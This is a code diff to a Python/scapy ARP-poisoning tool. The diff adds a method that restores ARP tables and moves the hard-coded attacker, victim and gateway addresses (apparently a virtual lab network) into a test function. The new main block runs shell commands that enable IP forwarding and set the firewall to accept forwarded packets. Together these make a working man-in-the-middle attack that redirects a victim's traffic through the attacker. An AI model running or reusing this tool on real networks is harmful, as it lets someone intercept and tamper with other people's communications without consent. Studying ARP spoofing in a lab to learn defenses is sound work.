@@ -1,6 +1,8 @@
 from scapy.all import *
 import multiprocessing
+import threading
 import time
+import os
 
 class ArpPoisoner(multiprocessing.Process):
 
@@ -8,7 +10,7 @@ class ArpPoisoner(multiprocessing.Process):
 
         multiprocessing.Process.__init__(self)
 
-        self.interface = interface    #enp0s3
+        self.interface = interface
         self.packets = []    #The packets which will be used to spoof
 
         self.exit = multiprocessing.Event()
@@ -43,21 +45,34 @@ class ArpPoisoner(multiprocessing.Process):
             
             time.sleep(2)
 
+    def restore_arp(self, mac_attacker, mac_victim, ip_victim, mac_gateway, ip_gateway):
+        """Restores arp addresses to their original pre-spoof state."""
+        
+        #Initialize restore packets
+        restore_packet_gateway = Ether(src=mac_attacker)/ARP(op=2,hwsrc=mac_victim, hwdst=mac_gateway, psrc=ip_victim, pdst=ip_gateway)
+        restore_packet_victim = Ether(src=mac_attacker)/ARP(op=2,hwsrc=mac_gateway, hwdst=mac_victim, psrc=ip_gateway, pdst=ip_victim) 
+
+        sendp(restore_packet_gateway, iface = self.interface, verbose=0)
+        sendp(restore_packet_victim, iface = self.interface, verbose=0)
+    
+        print "Restored ARP tables"
+
     def stop(self):
         """Stops the sending of the spoofing packets."""
-
         self.exit.set()
 
+def test_cb():
 
-if __name__ == "__main__":
-    
     arp_poisoner = ArpPoisoner("enp0s10")
+
     mac_attacker = "08:00:27:52:b1:13"
     mac_victim = "08:00:27:69:ca:f1"
     mac_gateway = "52:54:00:12:35:00"
-    ip_attacker = "10.0.123.6"
-    ip_victim = "10.0.123.5"
+
+    ip_attacker = "10.0.123.5"
+    ip_victim = "10.0.123.4"
     ip_gateway = "10.0.123.1"
+
     # Create packet to send to victim
     arp_poisoner.add_packet(mac_attacker, mac_victim, ip_gateway, ip_victim)
 
@@ -68,3 +83,16 @@ if __name__ == "__main__":
     arp_poisoner.run()
     time.sleep(10)
     arp_poisoner.stop()
+
+def test():
+
+    thread = threading.Thread(target=test_cb)
+    thread.run()
+
+if __name__ == "__main__":
+
+    import os
+    os.system("sysctl -w net.ipv4.ip_forward=1")
+    os.system("iptables -P FORWARD ACCEPT")
+
+    test()
